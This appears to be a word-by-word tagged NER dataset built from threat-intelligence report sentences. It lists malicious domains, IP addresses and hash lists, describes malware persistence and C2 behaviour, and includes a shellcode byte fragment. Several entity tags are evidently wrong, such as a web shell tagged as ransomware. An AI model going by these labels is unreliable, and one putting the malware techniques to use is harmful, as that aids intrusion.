Affairs O
( O
DFA O
) O
are O
the O
target O
. O

We O
use O
cookies O
to O
make O
your O
experience O
of O
our O
websites O
better O
. O

We O
do O
not O
have O
indication O
that O
the O
attacks O
succeeded O
in O
infecting O
IEC O
related O
computers O
or O
stealing O
information O
. O

The O
early O
samples O
on O
the O
compromised O
machine O
could O
be O
associated O
with O
DarkHotel O
. O

niggmhggmeggmkggmfggmdggidggngggmjgg.ijhlokga.dwarduong[.]com B-url.unknown

64 O
A1 O
30 O
00 O
00 O
00 O
8B O
40 O
0C O
8B O
70 O
1C O
Push O
Urlmon O
string O
to O
stack O
using O
two O
push O
statements O
. O

The O
same O
information O
is O
sent O
to O
panel-dark[.]com/Contador/put.php B-url.unknown
( O
Figure O
21 O
) O
. O

Strings O
and O
code O
are O
simple O
, O
innovative O
, O
and O
concise O
. O

Finally O
the O
driver O
is O
started O
using O
the O
ZwLoadDriver O
native O
API O
. O

All O
future O
calls O
to O
ReadDataBlockValue O
return O
the O
recorded O
data O
. O

Then O
it O
was O
attacked O
by O
Lurker B-malware.backdoor
Trojan B-malware.backdoor
. O

Hyundai O
Merchant O
Marine O
is O
a O
South O
Korean O
logistics O
company O
providing O
worldwide O
container O
shipping O
services O
. O

We O
have O
offered O
to O
help O
them O
translate O
any O
warning O
materials O
into O
Arabic O
. O

This O
links O
the O
previous O
samples O
with O
this O
unique O
username O
. O

If O
the O
process O
is O
running O
with O
administrator O
privileges O
, O
then O
the O
malware O
achieves O
persistence O
by O
creating O
a O
service O
, O
else O
the O
classic O
Windows O
' O
Run O
' O
registry O
key O
is O
used O
( O
HKCU\SOFTWARE\Microsoft\ O
Windows\CurrentVersion\Run O
; O
DeviceAssociationService;rastlsc.exe O
) O
. O

FinFisher O
, O
VUPEN O
and O
Hacking O
Team O
have O
all O
used O
similar O
language O
. O

Because O
we O
are O
talking O
about O
StrongPity O
watering B-malware.backdoor
holes I-malware.backdoor
, O
let O
's O
take O
a O
quick O
look O
at O
what O
is O
being O
delivered O
by O
the O
group O
from O
these O
sites O
. O

Email O

REGIONAL O
HIGH-TECH O
REGIONAL O
MANUFACTURING O

Web O
. O

In O
many O
cases O
, O
the O
scripts O
utilized O
Microsoft O
OneDrive O
accounts O
for O
data O
transfer O
. O

3cfc7666c97c38f38a3b3ec1d132f2836ade7e B-hash
6e6e3cddb30b0d7d81682de0b2 I-hash
3e9eab029c52ac34b91f906c8f92ad9059531f B-hash
825905260023764f8a069edbbf I-hash
396a684949c96815b54c8e4c2fafbe6324d8c B-hash
4dde2c9294411658fb5209cd70c I-hash
1cc7ad407fc87acb9c961105943c87a7bd77c B-hash
4d4cc90b84b46fb5dcf779b50fd I-hash
3368b6060d181e39a57759ab9b7f01221e0cd B-hash
3a397000977aa8bb07a0e6a94ca I-hash
ca70aa2f89bee0c22ebc18bd5569e542f09d3 B-hash
c4a060b094ec6abeeeb4768a143 I-hash
f94fb5028a81177bb5ea3428349da4d9b125f8 B-hash
1adb658df40d6e8f3ea0e0e3e7 I-hash
cf065e50a5bef24099599af6a60a78c1607a04 B-hash
b21d3573a25ab26bf044a119d6 I-hash
5afa8329c0a159811b55c92303f0d0b9b8834 B-hash
843c76f51777593d414bda5191b I-hash
77cee0ccc739d3d420e95460c72f7ad2a9846f B-hash
06e4a7089fb92b8fca4a52ce3f I-hash

page O
| O
11 O

ZxShell B-malware.backdoor
is O
one O
sample O
amongst O
several O
tools O
that O
Group O
72 O
used O
within O
their O
campaign O
. O

Mandiant O
consultants O
suspect O
that O
APT32 B-malware.infosteal
was O
monitoring O
web O
logs O
to O
track O
the O
public O
IP O
address O
used O
to O
request O
remote O
images O
. O

The O
attacker O
might O
exploit O
the O
following O
ways O
to O
control O
the O
target O
host O
, O
such O
as O
social O
engineering O
e-mails O
, O
file O
bundling O
, O
exploiting O
system O
and O
application O
vulneratbilities O
, O
lateral O
movement O
of O
intranet O
and O
so O
on O
. O

The O
second O
big O
mistake O
in O
the O
implementation O
of O
DarkComet B-malware.backdoor
's O
HTTP O
flood O
attack O
becomes O
apparent O
further O
down O
in O
the O
attack O
thread O
code O
, O
just O
before O
the O
( O
buggy O
) O
HTTP O
request O
payload O
is O
sent O
to O
the O
target O
via O
the O
send O
( O
) O
API O
: O

To O
get O
the O
command O
string O
malware O
extracts O
the O
string O
starting O
from O
the O
offset O
of O
the O
string O
' O
updatetpermission O
' O
+ O
19 O
and O
extracts O
a O
7 O
character O
length O
string O
which O
it O
uses O
as O
the O
command O
string O
. O

We O
wrote O
a O
script O
to O
extract O
version O
info O
from O
the O
binaries O
we O
have O
. O

It O
is O
rare O
to O
find O
a O
malware O
written O
in O
Delphi O
language O
, O
but O
previous O
investigations O
conducted O
by O
other O
security O
firms O
confirm O
that O
the O
APT28 O
group O
already O
used O
malware O
written O
in O
this O
language O
in O
past O
campaigns O
. O

Some O
of O
the O
emails O
subjects O
were O
: O

The O
document O
claims O
to O
be O
a O
registration O
form O
for O
an O
event O
with O
HDMC O
, O
an O
organization O
in O
Vietnam O
that O
advertises O
national O
independence O
and O
democracy O
. O

We O
've O
seen O
quite O
a O
few O
versions O
of O
these O
implants O
, O
which O
were O
relatively O
widespread O
at O
some O
point O
or O
still O
are O
. O

6332 O
Jan O
01 O
22:53:23 O
2009 O
7061 O
Jul O
14 O
13:05:31 O
2010 O

The O
oldest O
version O
we O
identified O
is O
G1 O
. O

The O
keyboard O
walk O
used O
for O
the O
symbols O
' O
! O

37b90673aa83d177767d6289c4b90468 B-hash
Server O
Platino4 O
C5AapWKh O
C5AapWKh O
C5AapWKh O
C5AapWKh O

CORE O

**Xagent O
versions O
4-6 O
as O
seen O
by O
VT O

When O
this O
malicious O
DLL O
is O
executed O
by O
calling O
it O
with O
its O
' O
DllRegisterServer O
' O
function O
, O
the O
Victim O
system O
establishes O
a O
secure O
and O
encrypted O
connection O
on O
port O
443 O
and O
beacons O
with O
the O
following O
request O
( O
encryption O
layer O
removed O
) O
. O

Version O
4.0 O
Version O
4.2 O

We O
have O
observed O
multiple O
probable O
malware O
attacks O
against O
Israeli O
and O
Palestinian O
targets O
. O

A O
full O
request O
looks O
like O
: O

However O
, O
the O
execution O
and O
control O
still O
can O
be O
made O
depending O
on O
system O
and O
application O
vulnerabilities O
without O
this O
leading O
file O
. O

' O
19A O
: O
Amount O
' O
' O
: O
Debit O
' O
' O
Debit/Credit O
: O
' O
' O
Sender O
: O
' O
' O
Amount O
: O
' O
' O
FEDERAL O
RESERVE O
BANK O
' O
' O
D O
' O
' O
C O
' O
' O
62F O
: O
' O
' O
60F O
: O
' O
' O
60M O
: O
' O
' O
62M O
: O
' O
' O
Credit O
' O
' O
Debit O
' O
' O
64 O
: O
' O
' O
20 O
: O
Transaction O
' O
' O
90B O
: O
Price O
' O

Those O
changes O
were O
sparked O
by O
advances O
in O
code O
and O
the O
need O
to O
avoid O
detection O
by O
antivirus O
solutions O
. O

Cobalt O
Strike O
is O
the O
GUI O
framework O
penetration O
tool O
based O
on O
metasploit O
. O

It O
also O
implies O
that O
IRONGATE B-malware.backdoor
's O
purpose O
was O
malicious O
, O
as O
opposed O
to O
a O
tool O
written O
for O
other O
legitimate O
purposes O
. O

29BD1BAC25F753693DF2DDF70B83F0E183D9550D B-hash
FC92EAC99460FA6F1A40D5A4ACD1B7C3C6647642 I-hash
6609A347932A11FA4C305817A78638E07F04B09F B-hash

The O
decryption O
algorithm O
of O
this O
attack O
is O
as O
follow O
: O
The O
decryption O
algorithm O
APT-C-06 O
used O
is O
as O
follow O
: O
In O
the O
further O
analysis O
, O
we O
found O
the O
same O
decryption O
algorithm O
was O
used O
in O
the O
64-bit O
version O
of O
the O
relevant O
malware O
. O

This O
DLL O
sends O
a O
POST O
request O
over O
the O
HTTP O
protocol O
to O
communicate O
. O

Other O
functionalities O
provided O
by O
this O
section O
of O
the O
PowerShell O
Script O
are O
as O
follows O
: O
Retrieves O
the O
following O
data O
from O
the O
system O
by O
leveraging O
Windows O
Management O
Instrumentation O
( O
WMI O
) O
queries O
and O
environment O
variables O
: O
IP O
Address O
from O
Network O
Adapter O
Configuration O
OS O
Name O
OS O
Architecture O
Computer O
Name O
Computer O
Domain O
Name O
Username O
All O
of O
this O
data O
is O
concatenated O
and O
formatted O
as O
shown O
in O
Figure O
13 O
: O
Register O
the O
victim O
's O
machine O
to O
the O
C2 O
server O
by O
sending O
the O
REGISTER O
command O
to O
the O
server O
. O

Identity.p12 O
: O
This O
is O
another O
certificate O
, O
which O
points O
to O
an O
apparent O
reference O
to O
Russia O
by O
using O
another O
mail.ru O
address O
. O

may O
be O
a O
Sharepoint O
user O
account O
whilst O
scomadmin O
likely O
corresponds O
to O
System O
Center O
Operations O
Manager O
admin O
– O
an O
account O
for O
managing O
machines O
in O
a O
data O
centre O
. O

The O
authors O
wish O
to O
give O
special O
thanks O
VirusTotal O
, O
Joe O
Security O
, O
Hex-Rays O
, O
and O
Passive O
Total O
for O
providing O
access O
to O
their O
software O
and O
services O
. O

The O
third O
technique O
uses O
the O
Win32_Computer O
entry O
in O
WMI O
. O

It O
consists O
of O
two O
parts O
: O
payload O
and O
configuration O
. O

DWORD3 O
== O
~DWORD0 O
DWORD8 O
== O
ROR O
( O
DWORD0 O
, O
7 O
) O

During O
Operation O
Cobalt O
Kitty O
, O
the O
attackers O
compromised O
more O
than O
40 O
PCs O
and O
servers O
, O
including O
the O
domain O
controller O
, O
file O
servers O
, O
Web O
application O
server O
and O
database O
server O
. O

4 O
It O
also O
uses O
Wave O
APIs O
to O
capture O
audio O
. O

But O
he O
or O
she O
managed O
to O
stay O
under O
the O
radar O
since O
2016 O
. O

The O
update.exe B-malware.drop
dropper O
includes O
a O
check O
for O
VMware O
instead O
of O
Cuckoo O
. O

We O
filtered O
out O
all O
non-XtremeRAT O
traffic O
and O
ensured O
that O
each O
of O
the O
12000 O
IPs O
attempted O
to O
make O
an O
XtremeRAT B-malware.backdoor
connection O
. O

Background O

Its O
a O
.php-script O
named O
config.inc O
, O
containing O
variables O
which O
look O
familiar O
from O
Babar O
's O
config O
such O
as O
' O
user O
' O
, O
' O
id O
' O
or O
' O
seq O
' O
, O
but O
also O
a O
handful O
of O
comments O
from O
the O
authors O
. O

Server.csr O
: O
In O
this O
certificate O
, O
the O
attacker O
mentioned O
Hrvatska O
( O
' O
Croatia O
' O
in O
the O
Croatian O
language O
) O
with O
the O
same O
Russian O
email O
. O

Notes O
: O
Executable O
file O
downloaded O
by O
Java O
Applet O
that O
has O
been O
encoded O
with O
XOR O
0Ã—99 O
Taking O
a O
closer O
look O
at O
the O
resulting O
executable O
we O
have O
, O
it O
turns O
out O
it O
is O
a O
newer O
sample O
of O
PlugX O
. O

This O
tool O
is O
responsible O
for O
stealing O
information O
— O
specifically O
the O
environment O
information O
— O
within O
the O
target O
system O
. O

: O
D O
STR O

case O
' O
f O
' O
: O

testfile.exe O
) O
as O
shown O
below O
. O

It O
is O
however O
interesting O
to O
note O
the O
hostnames O
some O
of O
these O
connect O
to O
– O
like O
' O
terroristttt.no-ip.biz B-url.unknown
' O
. O

/research/threat-group-4127-targets-hillary-clinton-presidential-campaign B-url.normal
SecureWorks O
Counter O
Threat O
UnitTM O
Threat O
Intelligence O
16 O
June O
2016 O
SecureWorks O
Counter O
Threat O
UnitTM O
( O
CTU O
) O
researchers O
track O
the O
activities O
of O
Threat O
Group-4127 O
( O
TG-4127 B-malware.infosteal
) O
, O
which O
targets O
governments O
, O
military O
, O
and O
international O
non-governmental O
organizations O
( O
NGOs O
) O
. O

Execute O
a O
command O
, O
redirect O
its O
output O
to O
the O
file O
% O
TEMP%\~D%random%.tmp O
. O

AutoIt O
Script O

To O
maximize O
physical O
impact O
, O
a O
cyber O
attacker O
would O
also O
need O
to O
bypass O
safety O
controls O
. O

Service O
names O
: O

Tariq O
Masud O

On O
each O
iteration O
of O
the O
loop O
, O
DarkComet B-malware.backdoor
will O
process O
a O
pair O
of O
two O
source O
bytes O
to O
yield O
one O
output O
byte O
. O

ChessMaster O
can O
utilize O
any O
of O
these O
methods O
to O
download O
the O
next O
malware O
in O
the O
chain O
, O
the O
open O
source O
post-exploitation O
tool O
known O
as O
' O
Koadic B-malware.unknown
, O
' O
which O
the O
previous O
campaign O
also O
used O
. O

[ O
그림 O
20 O
] O
Zcon.exe O
안다리엘 O
그룹은 O
Crash.exe O
, O
Test.exe라는 O
이름의 O
악성코드를 O
제작했는데 O
, O
이들 O
악성코드는 O
매년 O
8월 O
이후 O
하 O
드디스크 O
내용을 O
파괴하는 O
기능을 O
갖고 O
있다 O
. O

Figure O
6 O
shows O
the O
extracted O
NBIs O
. O

Figure O
3 O
. O

Call O
path O
determined O
and O
embedded O
in O
network O
beacon O

' O
US O
Superstars O
Serena O
and O
Venus O
Williams O
and O
Simone O
Biles O
Given O
Drugs O
Exemption O
, O
Russian O
Hackers O
Reveal O
. O
' O

The O
loader O
DLL O
is O
responsible O
for O
decrypting O
and O
injecting O
the O
core O
payload O
DLL O
into O
memory O
, O
from O
an O
encrypted O
 le O
present O
on O
disk O
. O

The O
information O
exfiltrated O
is O
then O
leveraged O
by O
a O
company O
front O
to O
blackmail O
victim O
companies O
into O
contracting O
the O
Poseidon B-malware.infosteal
Group O
as O
a O
security O
firm O
. O

Once O
on O
the O
SIS O
network O
, O
the O
attacker O
used O
their O
pre-built O
TRITON B-malware.infosteal
attack O
framework O
to O
interact O
with O
the O
SIS O
controllers O
using O
the O
TriStation O
protocol O
. O

lasted O
10 O
seconds O
. O

FBI O
: O

Many O
of O
these O
individuals O
held O
communications O
, O
media O
, O
finance O
, O
or O
policy O
roles O
. O

This O
word O
is O
derived O
from O
the O
Spanish O
word O
chinche O
, O
meaning O
pest O
. O

If O

siCreateTime O
( O
UTC O
) O
6/6/2013 O
16:01 O
2/21/2003 O
22:48 O
siAccessTime O
( O
UTC O
) O
6/20/2013 O
1:41 O
6/25/2013 O
18:56 O
siModTime O
( O
UTC O
) O
6/7/2013 O
0:33 O
2/21/2003 O
22:48 O
siMFTModTime O
( O
UTC O
) O
6/20/2013 O
1:54 O
6/25/2013 O
18:56 O
fnCreateTime O
( O
UTC O
) O
6/6/2013 O
16:01 O
6/6/2013 O
16:01 O
fnAccessTime O
( O
UTC O
) O
6/6/2013 O
16:03 O
6/6/2013 O
16:03 O
fnModTime O
( O
UTC O
) O
6/4/2013 O
15:42 O
6/4/2013 O
15:42 O
fnMFTModTime O
( O
UTC O
) O
6/6/2013 O
16:04 O
6/6/2013 O
16:04 O

T O
he O
diversity O
of O
victims O
may O
indicate O
the O
diversity O
of O
the O
attackers O
' O
interests O
. O

? O
? O

A O
brief O
timeline O
of O
this O
activity O
is O
shown O
in O
Figure O
1 O
. O

A O
national O
data O
center O
is O
a O
valuable O
source O
of O
data O
that O
can O
also O
be O
abused O
to O
compromise O
official O
websites O
. O

zxFunction001 O
modifies O
the O
current O
process O
memory O
, O
uses O
data O
contained O
in O
the O
named O
pipe O
to O
create O
a O
socket O
, O
and O
then O
executes O
the O
code O
that O
sends O
the O
remote O
desktop O
session O
to O
the O
server O
controller O
. O

The O
following O
will O
present O
detailed O
information O
about O
some O
of O
the O
phishing O
emails O
observed O
and O
the O
attached O
malware O
: O

The O
network O
protocol O
of O
the O
backdoor O
is O
well O
described O
by O
JPCERT O
, O
but O
Cylance O
has O
taken O
the O
liberty O
to O
clean O
up O
their O
original O
python O
snippet O
, O
which O
was O
provided O
for O
decoding O
the O
cookie O
values O
: O

Canada O
Canada O
217.16.xxx.xxx B-ip.unknown
PIPNI O
VPS O
Czech O
Republic O
217.146.xxx.xxx B-ip.unknown
Zone O
Media O
UVS/Nodes O
213.55.99.74 B-ip.unknown
Ethio O
Telecom O
80.156.xxx.xxx B-ip.unknown
Gamma O
International O
GmbH O
37.200.xxx.xxx B-ip.unknown
JiffyBox O
Servers O
Estonia O
Estonia O
Germany O
Germany O
178.77.xxx.xxx B-ip.unknown
HostEurope O
GmbH O
Germany O
119.18.xxx.xxx B-ip.unknown
HostGator O
119.18.xxx.xxx B-ip.unknown
HostGator O
118.97.xxx.xxx B-ip.unknown
PT O
Telkom O
118.97.xxx.xxx B-ip.unknown
PT O
Telkom O
103.28.xxx.xxx B-ip.unknown
PT O
Matrixnet O
Global O
112.78.143.34 B-ip.unknown
Biznet O
ISP O
112.78.143.26 B-ip.unknown
Biznet O
ISP O
187.188.xxx.xxx B-ip.unknown
Iusacell O
PCS O
201.122.xxx.xxx B-ip.unknown
UniNet O
164.138.xxx.xxx B-ip.unknown
164.138.28.2 B-ip.unknown
Tilaa O
Tilaa O
78.100.57.165 B-ip.unknown
Qtel O
– O
Government O
Relations O
195.178.xxx.xxx B-ip.unknown
Tri.d.o.o O
/ O
Telekom O
Srbija O
India O
India O
Indonesia O
Indonesia O
Indonesia O
Indonesia O
Indonesia O
Malaysia O
Mexico O
Mexico O
Netherlands O
Netherlands O
Qatar O
Serbia O
Singapore O
217.174.229.82 B-ip.unknown
Ministry O
of O
Communications O
Turkmenistan O
72.22.xxx.xxx B-ip.unknown
iPower O
, O
Inc O
. O

The O
traffic O
shown O
in O
blue O
at O
the O
bottom O
is O
the O
response O
from O
the O
target O
( O
Web B-malware.ransom
shell O
) O
. O

Background O

This O
allows O
an O
attacker O
to O
hide O
their O
communication O
within O
a O
cluster O
of O
network O
sessions O
originating O
from O
a O
single O
IP O
such O
as O
would O
be O
the O
case O
for O
a O
client O
performing O
multiple O
HTTP O
requests O
against O
a O
web O
server O
. O

It O
analyses O
new O
attacks O
by O
Molerats O
against O
targets O
in O
Israel O
, O
The O
United O
States O
, O
Egypt O
, O
Saudi O
Arabia O
, O
United O
Arab O
Emirates O
and O
The O
Palestinian O
Authority O
. O

Probing O
Confucius O
' O
infrastructure O
, O
we O
came O
across O
websites O
offering O
Windows O
and O
Android O
chat O
applications O
, O
most O
likely O
iterations O
of O
its O
predecessor O
, O
Simple O
Chat O
Point O
: O
Secret O
Chat O
Point O
, O
and O
Tweety B-malware.backdoor
Chat I-malware.backdoor
. O

Sancho O
, O
David O
; O
Dela O
Torre O
, O
Jessa O
; O
Bakuei O
, O
Matsukawa O
; O
Villeneuve O
, O
Nart O
; O
and O
McArdle O
, O
Robert O
. O

Office O
Document O
with O
Embedded B-malware.backdoor
Flash I-malware.backdoor
Using O
Remote O
Inclusion O
: O
The O
document O
utilized O
in O
the O
attack O
utilizes O
an O
uncommon O
method O
of O
embedding O
Flash O
and O
such O
methods O
, O
particularly O
from O
untrusted O
sources O
, O
should O
be O
considered O
suspicious O
. O

Among O
the O
organizations O
we O
counted O
, O
11 O
are O
based O
in O
South O
Korea O
and O
two O
entities O
reside O
in O
China O
. O

Victims O
in O
the O
USA O
are O
situated O
in O
several O
states O
, O
including O
Nevada O
( O
Las O
Vegas O
) O
, O
California O
, O
and O
New O
York O
, O
and O
include O
casinos O
and O
hotels O
. O

The O
malware O
sets O
up O
a O
scheduled O
task O
that O
checks O
if O
chrome O
is O
already O
running O
, O
every O
minute O
, O
if O
it O
is O
n't O
, O
it O
will O
' O
silent-launch O
' O
it O
as O
you O
can O
see O
in O
the O
following O
screenshot O
: O

Even O
when O
these O
samples O
are O
shared O
among O
companies O
or O
via O
other O
services O
like O
VirusTotal O
some O
malware O
samples O
can O
go O
unnoticed O
for O
months O
because O
they O
are O
marked O
as O
malware O
but O
given O
some O
generic O
name O
, O
such O
as O
' O
Win.Trojan.Agent O
' O
. O

iDefense O
assesses O
with O
high O
confidence O
that O
this O
campaign O
is O
associated O
with O
the O
threat O
group O
DRAGONFISH O
( O
also O
known O
as O
Lotus O
Blossom O
and O
Spring O
Dragon O
) O
. O

To O
sell O
the O
botnet B-malware.ransom
malware O
, O
the O
author O
used O
a O
quite O
sexy O
marketing O
flyer O
, O
but O
, O
actually O
, O
the O
malware O
turned O
out O
to O
be O
rather O
simple O
. O

Other O
attached O
drives O
or O
removable O
devices O
may O
also O
be O
targeted O
. O

( O
Source O
: O
www.phishtank.com B-url.unknown
) O
CTU O
researchers O
observed O
the O
first O
short O
links O
targeting O
hillaryclinton.com B-url.normal
email O
addresses O
being O
created O
in O
midMarch O
2016 O
; O
the O
last O
link O
was O
created O
in O
mid-May O
. O

Babar O
's O
anti-analysis O
measures O
are O
sparse O
. O

These O
attacks O
are O
riskier O
but O
come O
with O
a O
potentially O
higher O
reward O
and O
, O
if O
successful O
, O
could O
give O
the O
attackers O
access O
to O
a O
vast O
pool O
of O
potential O
targets O
. O

After O
selecting O
the O
port O
, O
the O
server O
variant O
will O
wait O
for O
incoming O
connections O
and O
instruct O
the O
driver O
to O
redirect O
appropriate O
TCP O
sessions O
to O
the O
listening O
port O
. O

The O
config O
file O
has O
either O
a O
' O
.nfo O
' O
or O
' O
.cfg O
' O
extension O
depending O
on O
the O
version O
. O

appear O
to O
take O
an O
additional O
parameter O
while O
files O
that O
end O
in O
- O
require O
a O
full O
file O
path O
. O

2013-08-05 O
2013-08-04 O
2013-07-31 O
www.ndbssh.com B-url.unknown
58.217.168.205 B-ip.unknown
www.ndbssh.com B-url.unknown
222.95.171.178 B-ip.unknown
www.ndbssh.com B-url.unknown
58.217.169.95 B-ip.unknown
CHINANET O
JIANGSU O
PROVINCE O
NETWORK O
CHINANET O
JIANGSU O
PROVINCE O
NETWORK O
CHINANET O
JIANGSU O
PROVINCE O
NETWORK O

It O
points O
towards O
the O
use O
of O
the O
same O
backend O
infrastructure O
, O
designed O
to O
control O
different O
types O
of O
malware O
. O

In O
other O
words O
, O
trigger O
a O
false O
positive O
. O

Mon O
Feb O
13 O
13:07:04 O
2012 O
( O
UTC O
) O
Wed O
Dec O
28 O
13:23:04 O
2011 O
( O
UTC O
) O
Thu O
Jan O
26 O
13:57:00 O
2012 O
( O
UTC O
) O
E O
: O
\Visual O
Studio O
2010\Projects\Agent_NextGen\Agent2011v3\Agent2011\Agent\tasks\bin\ O
GetPasswords\exe\GetPasswords.pdb O
D O
: O
\Projects\Agent2011\Agent2011\Agent\tasks\bin\systeminfo\exe\systeminfo.pdb O
\\192.168.56.101\true\soft\Agent\tasks\Screenshots\agent_screeshots\Release\agent_ O
screeshots.pdb O
• O
00f67deb6e435c68f8a39336c9effc45d395b134 B-hash
• O
01d3973e1bb46e2b75034736991c567862a11263 B-hash
• O
034481acd945028f4521cf0eaa3685c6202f9e19 B-hash
• O
04aefbf1527536159d72d20dea907cbd080793e3 B-hash
• O
08facf0ae484f5bc7b066bbdd382e683fdfcba77 B-hash
• O
0a38765d599865dabc394287e61f5e8f6ac442c5 B-hash
• O
1051f814b33991a1f8e551759ead44b8ee7fc2c9 B-hash
• O
1a3825ef1064c2bbea5169671ef62030b00875ca B-hash
• O
1d734a26184005603605aab67eba76d7d5ec3b8c B-hash
• O
1e02eea130d17b9afb712d846612ab8bd6972183 B-hash
• O
210bc99275368df7ea179055737cffc3a12a6614 B-hash
• O
23e20c523b9970686d913360d438c88e6067c157 B-hash
• O
2564d7d42384bd3dce7257ef4a0a4b0cedac635b B-hash
• O
259b4679c26625c452141861014fe2f2c336462b B-hash
• O
26d030c93c517d63147f502bf6536c3914698821 B-hash
• O
29686320a3f06030f7192ca5b4f3eb47e73cb470 B-hash
• O
29a91e7823046f4ec3fd6b3fd1b442eaa92f3565 B-hash
• O
31163d35c5a3caa5e82e1d9b0d1b4db8fbdd79fa B-hash
• O
32b0c8c46f8baaba0159967c5602f58dd73ebde9 B-hash
• O
33beb7a410f1cd699733000b5b30b5e4eb2062ba B-hash
• O
3583647ef8158e29e3c18413ece70c2851720926 B-hash
• O
365cbfe32a79ce41b049dd85bb30afc51ba1ea6f B-hash
• O
37144694cfa953ab7acd376c033beda45cc95f4d B-hash
• O
3a624b196576b03d327b43247a975da44688ffda B-hash
• O
3b297f0ca7750c0c74e5f931fec1528fe1ba6bc9 B-hash
• O
3c8ba7ca3675ecc75855a58b9c0527d067c88f86 B-hash
• O
3f0be1751afa9cb0fdd6bc6fc9874dd880bc8c1b B-hash
• O
41bb403d2549db95cfc6c851ef92ad26bdf2e906 B-hash
• O
42cfe068b0f476198b93393840d400424fd77f0c B-hash
• O
42fadc443025a132f833a4a5ed8a5350f79a86cc B-hash
• O
43a979aa6ab08685d9ce949c67e19bebbb3c3559 B-hash
• O
443bc2e77b10ae64af6321c2c7bfd311c0772503 B-hash
• O
44406a80f13045442ce6a28ee62a923ac8f8c56a B-hash
• O
482d1624f9450ca1c99926ceec2606260e7ce544 B-hash
• O
4975293c49ca223013088e51b8378e935322fe93 B-hash
• O
49fb759d133eeaab3fcc78cec64418e44ed649ab B-hash
• O
4a16674c799fae6535c82f878f6a37f94ee9a49b B-hash
• O
5150174a4d5e5bb0bccc568e82dbb86406487510 B-hash
• O
55bd71353408cdda1bdbbd54bc70b4c595d70e56 B-hash
• O
56ac317ed78f8016d59cb41e9283b1c08cbf149f B-hash
• O
5bcd74e0c3c661580201e7d8122d7525a1480b4c B-hash
• O
5d3b82cdea4ae066efd5d127c7dd222adee62d0b B-hash
• O
5d4535df615a30b87b57facf4babf8d506e86a07 B-hash
• O
5ffe420a3cc848024884db8e2cfed68c47368dae B-hash
• O
6502bffbd1324071c7461c50a2552e48084560ae B-hash
• O
662d3cb303450abae2b88699c7f48d74f84f0d5a B-hash
• O
669b7c98f0f697b91e95804dacdfe55fae3f0a85 B-hash
• O
69c82f6ca382bd2205d55b89f2e842b4790bda62 B-hash
• O
6b5ef7b76b35203dd323af49bfa27cfa7e1b6376 B-hash
• O
6b64ed0f4e39a1c320c7cbd342a93faed9f5df86 B-hash
• O
71c59eaa445346251467942bac489a9d4e807f7f B-hash
• O
75aeaee253b5c8ae701195e3b0f49308f3d1d932 B-hash
• O
75e03a17d49d1b052770a21520bc13b14fc6c607 B-hash
• O
7765a0869530c1a17b8fd339bbe55cc4c1bdba30 B-hash
• O
78e9960cc5819583fb98fb619b33bff7768ee861 B-hash
• O
7c710cf31f20ef7e0ad1809672255d4edfdff052 B-hash
• O
7c79e3205323b9917f9eedcd3d5a891d87ddf256 B-hash
• O
7cda99eefb5150b87278f9bcf6ac0bde534b99e8 B-hash
• O
80935ac2ab3cf5b2900b49f6982a6a3f4575367c B-hash
• O
81affba765aa87a0d0b12b5a213f09fd51e1e9a1 B-hash
• O
87668d14910c1e1bb8bbea0c6363f76e664dcd09 B-hash
• O
883292f00e5836f99a1943a6e0164d8c6c124478 B-hash
• O
8ad2003b99d92dfb9d85912ee6a39c46b1ec8137 B-hash
• O
8b357ff017df3ed882b278d0dbbdf129235d123d B-hash
• O
8ba7932a40008881a4ed975f52271c0b679eaff2 B-hash
• O
8bc2d5aa1f384d56f3e921bce5326de8ff4dce2d B-hash
• O
8c3ed0bbdc77aec299c77f666c21659840f5ce23 B-hash
• O
8cc326473fd30ab5c97709e5a91fb04e18e72e96 B-hash
• O
8f1ac45360196a7b5a1680ff839a131394e9d9b4 B-hash
• O
8f467b32f1ec0f3b2efe10b3fed2a14b16075702 B-hash
• O
9319bf72000f8e468c182947dd5c82fb8b9ae419 B-hash
• O
93d53be2c3e7961bc01e0bfa5065a2390305268c B-hash
• O
93ee1c714fad9cc1bf2cba19f3de9d1e83c665e2 B-hash
• O
94520b93510db0dc10387a65e0a46f45ab501226 B-hash
• O
975b86c329c537f763f94a3f12610304dd358ff8 B-hash
• O
9b56155b82f14000f0ec027f29ff20e6ae5205c2 B-hash
• O
9dc6bbc34933ffecbfbb454788bab4230fcc2c65 B-hash
• O
9e156f41ff9c17692c9eba5bdb67ac14f0c0473f B-hash
• O
9f8f1672594a6fbac43793c857dd7718e75f328a B-hash
• O
a38ea2533e3dfa6339726aafd4bc2bc7e3eec529 B-hash
• O
a7a00f35797db2db9302625be456671911896d27 B-hash
• O
a99d8313876015fcf1b783d38fee9e9c3cde088c B-hash
• O
ac2b5928f46069111f4334f650a7dbf1b5f026d5 B-hash
• O
b26bc0a3e35c474f7099bd2b066f1680f3394b14 B-hash
• O
b2b2e5c5a6f8a07f051aab14fbec1f6607888b50 B-hash
• O
b47e711845d03c389004c912b3fbfc59228bb18c B-hash
• O
b5e973df0a159ab583fc8923c796c8cbf5b535df B-hash
• O
ba29768a2452a0e3abde02a903e53a181ee05bc8 B-hash
• O
bdd2bae83c3bab9ba0c199492fe57e70c6425dd3 B-hash
• O
bf265227f9a8e22ea1c0035ac4d2449ceed43e2b B-hash
• O
bf9d3a45273608caf90084c1157de2074322a230 B-hash
• O
c02b8c2bc15dd8a7110e5f1765716464bf421591 B-hash
• O
c117608dab3ab632de8110f8981dd7e773c61d05 B-hash
• O
c3d8a548fa0525e1e55aa592e14303fc6964d28d B-hash
• O
c3fde950fe7d668805b40b1680d519f20c18b899 B-hash
• O
c5ef4c31693845d492285e5f1c7ff3c293f99976 B-hash
• O
c62e840ffe4bba50f6584b33a877475f0ebcf558 B-hash
• O
c6472898e9085e563cd56baeb6b6e21928c5486d B-hash
• O
c7b91ff3cc69dab807016aa76d0c261411ccf27d B-hash
• O
c8fe2296565c211e019cdad3918a5736d4b12d44 B-hash
• O
caa1083d2f20be0858e8d3d0671c042d0455a657 B-hash
• O
cb7652aede9b1b7d756019f44c25fb0263498313 B-hash
• O
ccf83cd713e0f078697f9e842a06d624f8b9757e B-hash
• O
ce9d077349638ffd3e1ad68cda76c12cfb024069 B-hash
• O
cebcf2f495c3b95138128d0577dcac5cde29490d B-hash
• O
d12e4f164a4734e8136da85001750157014d012c B-hash
• O
d3254f1f4c4def8c023982dfb28fa31e91b69ab5 B-hash
• O
d5cbf554e4e700b37ddcb026d4407fcd87032d87 B-hash
• O
d89fc09f1aa72547d4b7f022470b6c8362997a5f B-hash
• O
daa651188610fd9c5a6987109e7ee5504d72a35d B-hash
• O
e0779ac6e5cc76e91fca71efeade2a5d7f099c80 B-hash
• O
